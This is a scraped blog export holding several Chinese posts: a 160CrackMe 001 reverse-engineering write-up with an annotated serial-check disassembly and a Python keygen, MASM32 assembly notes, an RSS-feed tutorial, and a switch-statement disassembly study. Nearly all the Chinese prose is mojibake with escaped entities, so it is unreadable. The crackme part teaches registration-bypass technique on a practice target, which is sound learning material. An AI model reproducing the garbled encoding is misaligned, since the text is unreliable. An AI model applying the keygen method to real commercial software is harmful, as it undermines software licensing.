Acid_bur.0042FBC8 ; - ;ä¸¤ä¸ªpushæŠŠ\u0026#34;CW\u0026#34;å’Œ\u0026#34;-\u0026#34;å…¥æ ˆ 0042FAC5 |. 8D55 E8 lea edx,[local.6] 0042FAC8 |. A1 50174300 mov eax,dword ptr ds:[0x431750] 0042FACD |. E8 466CFDFF call Acid_bur.00406718 ; ç”¨æˆ·åç¬¬ä¸€ä¸ªå­—æ¯*29*2çš„å€¼æ”¾å…¥[local.6] 0042FAD2 |. FF75 E8 push [local.6] 0042FAD5 |. 68 C8FB4200 push Acid_bur.0042FBC8 ; - 0042FADA |. FF75 F8 push [local.2] ; \u0026#34;ç”¨æˆ·åç¬¬ä¸€ä¸ªå­—æ¯*29*2\u0026#34;,\u0026#34;-\u0026#34;,\u0026#34;CRACKED\u0026#34;å…¥æ ˆ 0042FADD |. 8D45 F4 lea eax,[local.3] 0042FAE0 |. BA 05000000 mov edx,0x5 0042FAE5 |. E8 C23EFDFF call Acid_bur.004039AC ; CW-ç®—å¥½çš„æ•°æ®-CRACKED æ”¾å…¥[local.3] 0042FAEA |. 8D55 F0 lea edx,[local.4] 0042FAED |. 8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0] 0042FAF3 |. E8 60AFFEFF call Acid_bur.0041AA58 0042FAF8 |. 8B55 F0 mov edx,[local.4] ; å–å‡ºä½ è¾“å…¥çš„å¯†ç =\u0026gt;edx 0042FAFB |. 8B45 F4 mov eax,[local.3] ; æ­£ç¡®å¯†ç =\u0026gt;eax 0042FAFE |. E8 F93EFDFF call Acid_bur.004039FC 0042FB03 |. 75 1A jnz short Acid_bur.0042FB1F ; åˆ¤æ–­å¯†ç æ˜¯å¦æ­£ç¡® 0042FB05 |. 6A 00 push 0x0 0042FB07 |. B9 CCFB4200 mov ecx,Acid_bur.0042FBCC ; Congratz !! 0042FB0C |. BA D8FB4200 mov edx,Acid_bur.0042FBD8 ; Good job dude =) 0042FB11 |. A1 480A4300 mov eax,dword ptr ds:[0x430A48] 0042FB16 |. 8B00 mov eax,dword ptr ds:[eax] 0042FB18 |. E8 53A6FFFF call Acid_bur.0042A170 0042FB1D |. EB 18 jmp short Acid_bur.0042FB37 0042FB1F |\u0026gt; 6A 00 push 0x0 0042FB21 |. B9 74FB4200 mov ecx,Acid_bur.0042FB74 ; Try Again! 0042FB26 |. BA 80FB4200 mov edx,Acid_bur.0042FB80 ; Sorry , The serial is incorect ! æ³¨å†Œç®—æ³•å°±æ˜¯password = \u0026ldquo;CW-\u0026rdquo; + å–ç”¨æˆ·åç¬¬ä¸€ä½asciix29x2 + \u0026ldquo;-CRACKED\u0026rdquo;\næ³¨å†Œæœºï¼ˆpythonï¼‰ï¼š\n1 2 3 4 5 import sys username = sys.argv[1] password = ord(username[0])*0x29*0x2 print(\u0026#34;password:\u0026#34;+\u0026#34;CW-\u0026#34;+\u0026#34;%d\u0026#34;%(password)+\u0026#34;-CRACKED\u0026#34;) æµ‹è¯•ï¼š\n1 2 C:\\Users\\Administrator\\Desktop\u0026gt;python 1.py akkuman password:CW-7954-CRACKED ","permalink":"https://www.hacktech.cn/post/160crackme-001.html","summary":"\u003cp\u003epeidåˆ¤æ–­æ— å£³ï¼Œæ‰“å¼€è¾“å…¥ä¼ªç æ³¨å†Œï¼Œæ ¹æ®æŠ¥é”™odæŸ¥æ‰¾å­—ç¬¦ä¸²\u003cbr\u003e\næ¥ä¸‹æ¥å®šä½åˆ°å­—ç¬¦ä¸²å‘¨è¾¹ä»£ç \u003c/p\u003e","title":"160CrackMeç»ƒæ‰‹ 001"},{"content":"å†…å­˜æ¨¡å¼ 1 2 3 .386 .model flat,stdcall ;å­ç¨‹åºè°ƒç”¨æ¨¡å¼ï¼Œwin32ä¸­åªèƒ½ç”¨stdcallï¼Œå› ä¸ºwin32apiè°ƒç”¨ä½¿ç”¨çš„è¿™ä¸ª option casemap:none ;å®šä¹‰äº†ç¨‹åºä¸­å˜é‡å’Œå­ç¨‹åºåæ˜¯å¦å¯¹å¤§å°å†™æ•æ„Ÿï¼Œwin32apiåç§°åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥åªéœ€è¦è®°ä½è¿™ä¸ªå®šå¼ æŒ‡å®šä½¿ç”¨çš„æŒ‡ä»¤é›† .model è¯­å¥ 1 .model å†…å­˜æ¨¡å¼[,è¯­è¨€æ¨¡å¼][,å…¶ä»–æ¨¡å¼] å†…å­˜æ¨¡å¼\næ¨¡å¼ å†…å­˜ä½¿ç”¨æ–¹å¼ tiny ç”¨æ¥å»ºç«‹.com æ–‡ä»¶ï¼Œæ‰€æœ‰çš„ä»£ç ã€æ•°æ®å’Œå †æ ˆéƒ½åœ¨åŒä¸€ä¸ª 64KB æ®µå†… small å»ºç«‹ä»£ç å’Œæ•°æ®åˆ†åˆ«ç”¨ä¸€ä¸ª 64KB æ®µçš„.exe æ–‡ä»¶ medium ä»£ç æ®µå¯ä»¥æœ‰å¤šä¸ª 64KB æ®µï¼Œæ•°æ®æ®µåªæœ‰ä¸€ä¸ª 64KB æ®µ compact ä»£ç æ®µåªæœ‰ä¸€ä¸ª 64KB æ®µï¼Œæ•°æ®æ®µå¯ä»¥æœ‰å¤šä¸ª 64KB æ®µ large ä»£ç æ®µå’Œæ•°æ®æ®µéƒ½å¯ä»¥æœ‰å¤šä¸ª 64KB æ®µ huge åŒ largeï¼Œå¹¶ä¸”æ•°æ®æ®µä¸­çš„ä¸€ä¸ªæ•°ç»„ä¹Ÿå¯ä»¥è¶…è¿‡ 64KB flat Win32 ç¨‹åºä½¿ç”¨çš„æ¨¡å¼ï¼Œä»£ç å’Œæ•°æ®ä½¿ç”¨åŒä¸€ä¸ª 4GB æ®µ å¯¹äº Win32 ç¨‹åºæ¥è¯´ï¼Œåªæœ‰ä¸€ç§å†…å­˜æ¨¡å¼ï¼Œflat æ¨¡å¼\næºç¨‹åºç»“æ„ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 .386 .model flat,stdcall option casemap:none \u0026lt;ä¸€äº›includeè¯­å¥\u0026gt; .stack [å †æ ˆæ®µçš„å¤§å°] ;å¸¸å¿½ç•¥ä¸å†™ .data \u0026lt;ä¸€äº›åˆå§‹åŒ–è¿‡çš„å˜é‡å®šä¹‰\u0026gt; .data? \u0026lt;ä¸€äº›æ²¡æœ‰åˆå§‹åŒ–è¿‡çš„å˜é‡å®šä¹‰\u0026gt; .const \u0026lt;ä¸€äº›å¸¸é‡å®šä¹‰\u0026gt; .code \u0026lt;ä»£ç \u0026gt; \u0026lt;å¼€å§‹æ ‡å·\u0026gt; \u0026lt;å…¶ä»–è¯­å¥\u0026gt; end \u0026lt;å¼€å§‹æ ‡å·\u0026gt; å±€éƒ¨å˜é‡çš„å®šä¹‰ 1 local å˜é‡å1[[é‡å¤æ•°é‡]][:ç±»å‹],å˜é‡å2[[é‡å¤æ•°é‡]][:ç±»å‹]...... local ä¼ªæŒ‡ä»¤å¿…é¡»ç´§æ¥åœ¨å­ç¨‹åºçš„ä¼ªæŒ‡ä»¤ proc å\nå˜é‡çš„ç±»å‹\nåç§° è¡¨ç¤ºæ–¹å¼ ç¼©å†™ å­—èŠ‚ Byte db å­— word dw åŒå­— (doubleword) dword dd ä¸‰å­— (farword) fword df å››å­— (quadword) qword dq åå­—èŠ‚ BCD ç  (tenbyte) tbyte dt æœ‰ç¬¦å·å­—èŠ‚ (signbyte) sbyte æœ‰ç¬¦å·å­— (signword) sword æœ‰ç¬¦å·åŒå­— (signdword) sdword å•ç²¾åº¦æµ®ç‚¹æ•° Real4 åŒç²¾åº¦æµ®ç‚¹æ•° Real8 10 å­—èŠ‚æµ®ç‚¹æ•° Real10 æ•°æ®ç»“æ„ 1 2 3 4 5 6 7 ç»“æ„å struct å­—æ®µ1 ç±»å‹ ? å­—æ®µ2 ç±»å‹ ? ...... ç»“æ„å ends å®šä¹‰\n1 2 3 4 5 .data? å˜é‡åç§° ç»“æ„å \u0026lt;å­—æ®µ1,å­—æ®µ2,...\u0026gt; ;æˆ–è€… .data? å˜é‡åç§° ç»“æ„å \u0026lt;\u0026gt; ä½¿ç”¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ;å‰æå‡è®¾ç»“æ„åä¸ºWNDCLASS,ç»“æ„ä½“å˜é‡åä¸ºstWndClass,é‡Œé¢æœ‰å­—æ®µlpfnWndProc ;1 mov eax,stWndClass.lpfnWndProc ;2.esiå¯„å­˜å™¨ä½œæŒ‡é’ˆå¯»å€ mov esi,offset stWndClass mov eax,[esi + WNDCLASS.lpfnWndProc] ;æ³¨æ„è¿™é‡Œæ˜¯WNDCLASS ;3.ç”¨assumeä¼ªæŒ‡ä»¤æŠŠå¯„å­˜å™¨é¢„å…ˆå®šä¹‰ä¸ºç»“æ„æŒ‡é’ˆ mov esi,offset stWndClass assume esi:ptr WNDCLASS mov eax,[esi].lpfnWndProc ... assume esi:nothing ;æ³¨æ„ï¼šä¸ä½¿ç”¨esiåšæŒ‡é’ˆçš„æ—¶å€™éœ€è¦ç”¨è¿™å¥å–æ¶ˆå®šä¹‰ ;4.ç»“æ„çš„å®šä¹‰å¯ä»¥åµŒå¥— NEW_WNDCLASS struct dwOption word ? oldWndClass WNDCLASS \u0026lt;\u0026gt; NEW_WNDCLASS ends ;5.åµŒå¥—çš„å¼•ç”¨ mov wax,[esi].oldWndClass.lpfnWndProc ä»¥ä¸åŒçš„ç±»å‹è®¿é—®å˜é‡ 1 2 3 4 5 6 ;ä»¥dbå®šä¹‰ä¸€ä¸ªç¼“å†²åŒº szBuffer db 1024 dup (?) ;mov ax,szBuffer ;é”™è¯¯ï¼Œmasmä¸­ï¼Œå¦‚æœè¦ç”¨åˆ¶å®šç±»å‹ä¹‹å¤–çš„é•¿åº¦è®¿é—®å˜é‡ï¼Œå¿…é¡»æ˜¾å¼æŒ‡å‡ºè¦è®¿é—®çš„é•¿åº¦ï¼Œè¿™æ ·ç¼–è¯‘å™¨å¿½ç•¥è¯­æ³•ä¸Šçš„é•¿åº¦æ£€éªŒï¼Œä»…ä½¿ç”¨å˜é‡çš„åœ°å€ ;ç±»å‹ ptr å˜é‡å mov ax,word ptr szBuffer mov eax,dword ptr szBuffer movzx æŠŠä¸€ä¸ªå­—èŠ‚æ‰©å±•åˆ°ä¸€ä¸ªå­—æˆ–ä¸€ä¸ªå­—æˆ–ä¸€ä¸ªåŒå­—å†æ”¾åˆ° ax æˆ– eax ä¸­ï¼Œé«˜ä½ä¿æŒ 0 è€Œä¸æ˜¯è¶Šç•Œå­˜å–åˆ°å…¶ä»–çš„å˜é‡\n1 2 3 4 5 .data bTest1 db 12h .code movzx ax,bTest1 movzx eax,bTest1 å˜é‡çš„å°ºå¯¸å’Œæ•°é‡ 1 2 sizeof å˜é‡åã€æ•°æ®ç±»å‹æˆ–æ•°æ®ç»“æ„å ;å–å¾—å˜é‡ã€æ•°æ®ç±»å‹æˆ–æ•°æ®ç»“æ„ä»¥å­—èŠ‚ä¸ºå•ä½çš„é•¿åº¦ lengthof å˜é‡åã€æ•°æ®ç±»å‹æˆ–æ•°æ®ç»“æ„å ;å–å¾—å˜é‡ä¸­æ•°æ®çš„é¡¹æ•° è·å–å˜é‡åœ°å€ 1 2 3 4 5 mov å¯„å­˜å™¨,offset å˜é‡å ;offsetæ˜¯å–å˜é‡åœ°å€çš„ä¼ªæ“ä½œç¬¦ lea eax,[ebp-4] ;è¿è¡Œæ—¶æŒ‰ç…§ebpçš„å€¼å®é™…è®¡ç®—å‡ºåœ°å€æ”¾åˆ°eaxä¸­ ;invokeä¼ªæŒ‡ä»¤å‚æ•°è¦ç”¨åˆ°ä¸€ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€æ—¶ï¼Œå‚æ•°ä¸­ä¸å¯èƒ½å†™å…¥leaæŒ‡ä»¤ï¼Œç”¨offsetåˆæ˜¯ä¸å¯¹çš„ï¼Œå¯ç”¨addr addr å±€éƒ¨å˜é‡åå’Œå…¨å±€å˜é‡å ;å…¨å±€å˜é‡åæ—¶ç¼–è¯‘å™¨æŒ‰ç…§odffsetçš„ç”¨æ³•æ¥ç”¨ï¼›å±€éƒ¨å˜é‡åæ—¶ï¼Œç¼–è¯‘å™¨ç”¨leaå…ˆæŠŠåœ°å€å–åˆ°waxä¸­ï¼Œç„¶åç”¨eaxä»£æ›¿å˜é‡åœ°å€ä½¿ç”¨ ;invokeä¸­ä½¿ç”¨addræ—¶ï¼Œå®ƒçš„å·¦è¾¹ä¸èƒ½ä½¿ç”¨waxï¼Œå¦åˆ™eaxçš„å€¼ä¼šè¢«è¦†ç›– å­ç¨‹åºçš„å®šä¹‰ 1 2 3 4 5 6 å­ç¨‹åºå proc [è·ç¦»][è¯­è¨€ç±»å‹][å¯è§†åŒºåŸŸ][USESå¯„å­˜å™¨åˆ—è¡¨][,å‚æ•°:ç±»å‹]...[VARARG] local å±€éƒ¨å˜é‡åˆ—è¡¨ æŒ‡ä»¤ å­ç¨‹åºå endp å‚æ•°ä¼ é€’å’Œå †æ ˆå¹³è¡¡ ä¸åŒè¯­è¨€è°ƒç”¨æ–¹å¼çš„å·®åˆ«\n\\ C SysCall StdCall BASIC FORTRAN PASCAL æœ€å…ˆå…¥æ ˆå‚æ•° å³ å³ å³ å·¦ å·¦ å·¦ æ¸…é™¤å †æ ˆè€… è°ƒç”¨è€… å­ç¨‹åº å­ç¨‹åº å­ç¨‹åº å­ç¨‹åº å­ç¨‹åº å…è®¸ä½¿ç”¨ VARARG æ˜¯ æ˜¯ æ˜¯ å¦ å¦ å¦ æ¡ä»¶æµ‹è¯•è¯­å¥ 1 2 3 4 5 6 7 å¯„å­˜å™¨æˆ–å˜é‡ æ“ä½œç¬¦ æ“ä½œæ•° (è¡¨è¾¾å¼1) é€»è¾‘è¿ç®—ç¬¦ (è¡¨è¾¾å¼2) é€»è¾‘è¿ç®—ç¬¦ (è¡¨è¾¾å¼3) ... ;ä¸¾ä¾‹ï¼Œå·¦è¾¹è¡¨è¾¾å¼ï¼Œå³è¾¹æ˜¯è¡¨è¾¾å¼ä¸ºçœŸçš„æ¡ä»¶ x==3 ;xç­‰äº3 eax!=3 ;eaxä¸ç­‰äº3 (y\u0026gt;=3)\u0026amp;\u0026amp;ebx ;yå¤§äºç­‰äº3ä¸”ebxä¸ºéé›¶å€¼ ;è¡¨è¾¾å¼çš„å·¦è¾¹åªèƒ½æ˜¯å˜é‡æˆ–å¯„å­˜å™¨ï¼Œä¸èƒ½ä¸ºå¸¸æ•°ï¼›è¡¨è¾¾å¼ä¸¤è¾¹ä¸èƒ½åŒæ—¶ä¸ºå˜é‡ï¼Œä½†å¯ä»¥åŒæ—¶æ˜¯å¯„å­˜å™¨ æ ‡å¿—ä½çš„çŠ¶æ€æŒ‡ç¤º\n1 2 3 4 5 CARRY? è¡¨ç¤ºCarryä½æ˜¯å¦ç½®ä½ OVERFLOW? è¡¨ç¤ºOverflowä½æ˜¯å¦ç½®ä½ PARITY? è¡¨ç¤ºParityä½æ˜¯å¦ç½®ä½ SIGN? è¡¨ç¤ºSignä½æ˜¯å¦ç½®ä½ ZERO? è¡¨ç¤ºZeroä½æ˜¯å¦ç½®ä½ åˆ†æ”¯è¯­å¥ 1 2 3 4 5 6 7 8 9 .if eax \u0026amp;\u0026amp; (bx \u0026gt;= dWX) || !(dWY != ecx) mov esi,1 .elseif edx mov esi,2 .elseif esi \u0026amp; 1 mov esi,3 .elseif ZERO? \u0026amp;\u0026amp; CARRY? mov esi,4 .endif å¾ªç¯è¯­å¥ 1 2 3 4 5 6 7 8 9 10 11 .while æ¡ä»¶æµ‹è¯•è¡¨è¾¾å¼ æŒ‡ä»¤ [.break [.if é€€å‡ºæ¡ä»¶]] [.continue] .endw ;æˆ– .repeat æŒ‡ä»¤ [.break [.if é€€å‡ºæ¡ä»¶]] [.continue] .until æ¡ä»¶æµ‹è¯•è¡¨è¾¾å¼ (æˆ– .untilcxz [æ¡ä»¶æµ‹è¯•è¡¨è¾¾å¼]) å˜é‡å’Œå‡½æ•°çš„å‘½å åŒˆç‰™åˆ©è¡¨ç¤ºæ³• 1 ç±»å‹å‰ç¼€+å˜é‡è¯´æ˜ï¼ˆç±»å‹ç”¨å°å†™å­—æ¯ï¼Œè¯´æ˜åˆ™ç”¨é¦–å­—æ¯å¤§å†™çš„å‡ ä¸ªå¼•æ–‡å•è¯ç»„æˆï¼‰ æ±‡ç¼–è¯­è¨€ä¸­å¸¸ç”¨çš„ç±»å‹å‰ç¼€\nå‰ç¼€ è¯´æ˜ b è¡¨ç¤º byte w è¡¨ç¤º word dw è¡¨ç¤º dword h è¡¨ç¤ºå¥æŸ„ lp è¡¨ç¤ºæŒ‡é’ˆ sz è¡¨ç¤ºä»¥ 0 ç»“å°¾çš„å­—ç¬¦ä¸² lpsz è¡¨ç¤ºæŒ‡å‘ 0 ç»“å°¾çš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆ f è¡¨ç¤ºæµ®ç‚¹æ•° st è¡¨ç¤ºä¸€ä¸ªæ•°æ®ç»“æ„ ä¸¾ä¾‹\nå˜é‡å è¯´æ˜ hWinMain ä¸»çª—å£çš„å¥æŸ„ dwTimeCount æ—¶é—´è®¡æ•°å™¨ï¼Œä»¥åŒå­—å®šä¹‰ szWelcome æ¬¢è¿ä¿¡æ¯å­—ç¬¦ä¸²ï¼Œä»¥ 0 ç»“å°¾ lpBuffer æŒ‡å‘ç¼“å­˜åŒºçš„æŒ‡é’ˆ stWndClass WNDCLASS ç»“æ„ æœ¬ä¹¦çš„ä½œè€…å»ºè®®\nå…¨å±€å˜é‡çš„å®šä¹‰ä½¿ç”¨æ ‡å‡†çš„åŒˆç‰™åˆ©è¡¨ç¤ºæ³•ï¼Œåœ¨å‚æ•°çš„å‰é¢åŠ ä¸‹åˆ’çº¿ï¼›åœ¨å±€éƒ¨å˜é‡çš„å‰é¢åŠ @ç¬¦å·ï¼Œè¿™æ ·å¼•ç”¨çš„æ—¶å€™å°±èƒ½éšæ—¶æ³¨æ„åˆ°å˜é‡çš„ä½œç”¨åŸŸã€‚ åœ¨å†…éƒ¨å­ç¨‹åºçš„åç§°å‰é¢åŠ ä¸‹åˆ’çº¿ï¼Œä»¥ä¾¿å’Œç³»ç»Ÿ API åŒºåˆ«ã€‚ ä¸¾ä¾‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 _Calc proc _dwX,_dwY local @dwResult finit fild _dwX fld st(0) fmul ;i * i fild _dwY fld st(0) fmul ;j * j fadd ;i * i + j * j fsqrt ;sqrt(i * i + j * j) fistp @dwResult ;put result mov eax,@dwResult ret _calc endp ","permalink":"https://www.hacktech.cn/post/windows%E7%8E%AF%E5%A2%83%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E7%AF%87.html","summary":"\u003ch2 id=\"å†…å­˜æ¨¡å¼\"\u003eå†…å­˜æ¨¡å¼\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  .386\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  .model flat,stdcall ;å­ç¨‹åºè°ƒç”¨æ¨¡å¼ï¼Œwin32ä¸­åªèƒ½ç”¨stdcallï¼Œå› ä¸ºwin32apiè°ƒç”¨ä½¿ç”¨çš„è¿™ä¸ª\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  option casemap:none ;å®šä¹‰äº†ç¨‹åºä¸­å˜é‡å’Œå­ç¨‹åºåæ˜¯å¦å¯¹å¤§å°å†™æ•æ„Ÿï¼Œwin32apiåç§°åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥åªéœ€è¦è®°ä½è¿™ä¸ªå®šå¼\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"Windows ç¯å¢ƒä¸‹ 32 ä½æ±‡ç¼–è¯­è¨€ç¨‹åºè®¾è®¡ç¬”è®° - åŸºç¡€ç¯‡"},{"content":"çƒ§åˆ¶RSSæº åˆ°Feed43æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œè™½è¯´ä¸æ³¨å†Œä¹Ÿèƒ½ç”¨ï¼Œä½†æ˜¯ä¸ºäº†æ–¹ä¾¿ä¿®æ”¹è‡ªå·±çƒ§åˆ¶çš„RSSï¼Œæœ€å¥½è¿˜æ˜¯æ³¨å†Œä¸€ä¸ªè´¦å·æ¥ç®¡ç† åˆ°ä¸»é¡µç‚¹å‡»Create new feed è¾“å…¥ç½‘å€ç‚¹å‡»reload å¯ä»¥çœ‹åˆ°è¯·æ±‚çš„htmlä¸­1å¤„æ˜¯æ–‡ç« çš„å®šä½å¤„ï¼Œæˆ‘ä»¬é’ˆå¯¹è¿™ä¸ªå†™å‡º2å¤„çš„ä»£ç å°±å¯ä»¥äº† ä¸‹é¢æ˜¯2å¤„çš„å…·ä½“ä»£ç \n1 2 3 4 5 6 7 //2å¤„çš„ä»£ç  \u0026lt;tr\u0026gt;{*} \u0026lt;td\u0026gt;{%}\u0026lt;/td\u0026gt;{*} \u0026lt;td{*}align=\u0026#34;left\u0026#34;\u0026gt;\u0026lt;a{*}href=\u0026#34;{%}\u0026#34;{*}target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026lt;font{*}color=\u0026#34;#F2753F\u0026#34;\u0026gt;{*} {%}\u0026lt;/font\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;{*} \u0026lt;td\u0026gt;{%}\u0026lt;/td\u0026gt;{*} \u0026lt;/tr\u0026gt;{*} åœ¨feed43ä¸­ï¼Œæˆ‘ä»¬ä¼šç”¨åˆ°ä¸¤ç§ä»£ç å—ï¼š{%}å’Œ{*}ï¼Œå…¶ä¸­{%}æ›¿æ¢ä½ æƒ³è·å–çš„å†…å®¹ï¼Œ{*}ç”¨æ¥çœç•¥æ— å…³ä»£ç \nå¡«å†™è§„åˆ™å®Œæˆåç‚¹å‡»Extractï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢æŠ“å–å‡ºäº†å…·ä½“çš„åˆ—è¡¨ æŠŠå…·ä½“è¦å±•ç¤ºçš„ä¿¡æ¯å˜é‡å¡«å†™å¥½ ç‚¹å‡»Previewå³å¯è·å–feedåœ°å€http://feed43.com/3772386342045020.xml è·å–å…¨æ–‡è¾“å‡ºfeed è¿™é‡Œæ¨èä¸¤ä¸ªç½‘å€ï¼Œç›´æ¥æŠŠä¸Šé¢æˆ‘ä»¬å¾—åˆ°çš„feedçš„åœ°å€å¡«å…¥å³å¯è·å–å…¨æ–‡çƒ§åˆ¶çš„RSS\nFull Rss FeedSoSo ","permalink":"https://www.hacktech.cn/post/how-to-make-rss-for-any-website.html","summary":"\u003ch2 id=\"çƒ§åˆ¶rssæº\"\u003eçƒ§åˆ¶RSSæº\u003c/h2\u003e","title":"å¦‚ä½•è‡ªå·±çƒ§åˆ¶å…¨æ–‡RSSï¼ˆæ‰“é€ è‡ªå·±RSSæºï¼‰"},{"content":"åœ¨åˆ†æ”¯è¾ƒå¤šçš„æ—¶å€™ï¼Œswitchçš„æ•ˆç‡æ¯”ifé«˜ï¼Œåœ¨åæ±‡ç¼–ä¸­æˆ‘ä»¬å³å¯çœ‹åˆ°æ•ˆç‡é«˜çš„åŸå› \n0x01åˆ†æ”¯ç»“æ„ä¸è¶…è¿‡3ä¸ª 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; void main() { int x = 5; switch(x) { case 5: printf(\u0026#34;%d\\n\u0026#34;,x); break; case 6: printf(\u0026#34;%d\\n\u0026#34;,x); break; case 7: printf(\u0026#34;%d\\n\u0026#34;,x); break; default: break; } return; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 5: int x = 5; 00401028 mov dword ptr [ebp-4],5 6: switch(x) 7: { 0040102F mov eax,dword ptr [ebp-4] 00401032 mov dword ptr [ebp-8],eax //xçš„å€¼æ”¾å…¥[ebp-8] 00401035 cmp dword ptr [ebp-8],5 00401039 je main+39h (00401049) //xä¸5ç›¸ç­‰å°±è·³è½¬ï¼Œä¸‹é¢6å’Œ7ç›¸åŒ 0040103B cmp dword ptr [ebp-8],6 0040103F je main+4Ch (0040105c) 00401041 cmp dword ptr [ebp-8],7 00401045 je main+5Fh (0040106f) 00401047 jmp main+72h (00401082) 8: case 5: 9: printf(\u0026#34;%d\\n\u0026#34;,x); 00401049 mov ecx,dword ptr [ebp-4] 0040104C push ecx 0040104D push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 00401052 call printf (004010d0) 00401057 add esp,8 10: break; 0040105A jmp main+83h (00401093) 11: case 6: 12: printf(\u0026#34;%d\\n\u0026#34;,x); 0040105C mov edx,dword ptr [ebp-4] 0040105F push edx 00401060 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 00401065 call printf (004010d0) 0040106A add esp,8 13: break; 0040106D jmp main+83h (00401093) 14: case 7: 15: printf(\u0026#34;%d\\n\u0026#34;,x); 0040106F mov eax,dword ptr [ebp-4] 00401072 push eax 00401073 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 00401078 call printf (004010d0) 0040107D add esp,8 16: break; 00401080 jmp main+83h (00401093) 17: default: 18: printf(\u0026#34;%d\\n\u0026#34;,x); 00401082 mov ecx,dword ptr [ebp-4] 00401085 push ecx 00401086 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 0040108B call printf (004010d0) 00401090 add esp,8 19: break; 20: } 0x02åˆ†æ”¯æ•°è¶…è¿‡3ä¸”åˆ†æ”¯å­˜åœ¨çº¿æ€§å…³ç³» 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;stdio.h\u0026gt; void main() { int x = 5; switch(x) { case 5: printf(\u0026#34;%d\\n\u0026#34;,x); break; case 6: printf(\u0026#34;%d\\n\u0026#34;,x); break; case 7: printf(\u0026#34;%d\\n\u0026#34;,x); break; case 8: printf(\u0026#34;%d\\n\u0026#34;,x); break; case 9: printf(\u0026#34;%d\\n\u0026#34;,x); break; default: printf(\u0026#34;%d\\n\u0026#34;,x); break; } return; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 5: int x = 5; 0040D778 mov dword ptr [ebp-4],5 6: switch(x) 7: { 0040D77F mov eax,dword ptr [ebp-4] 0040D782 mov dword ptr [ebp-8],eax 0040D785 mov ecx,dword ptr [ebp-8] 0040D788 sub ecx,5 //xå‡å»åˆ†æ”¯ä¸­çš„æœ€å°å€¼5ï¼Œæ–¹ä¾¿æ„å»ºè·³è½¬è¡¨ 0040D78B mov dword ptr [ebp-8],ecx 0040D78E cmp dword ptr [ebp-8],4 0040D792 ja $L537+13h (0040d7fd) //x-5\u0026gt;4è·³è½¬åˆ°defaultï¼Œå³x\u0026gt;9è·³è½¬ 0040D794 mov edx,dword ptr [ebp-8] //edx=x-5 0040D797 jmp dword ptr [edx*4+40D81Fh] //æ„å»ºè·³è½¬è¡¨ï¼Œæ ¹æ®edxçš„å€¼ä»å¯¹åº”åœ°å€å–å‡ºå€¼(å„ä¸ªåˆ†æ”¯çš„åœ°å€)ï¼Œ40D81Fä¸ºè·³è½¬è¡¨èµ·å§‹åœ°å€ 8: case 5: 9: printf(\u0026#34;%d\\n\u0026#34;,x); 0040D79E mov eax,dword ptr [ebp-4] 0040D7A1 push eax 0040D7A2 push offset string \u0026#34;%d\\n\u0026#34; (0042201c) 0040D7A7 call printf (004010d0) 0040D7AC add esp,8 10: break; 0040D7AF jmp $L537+24h 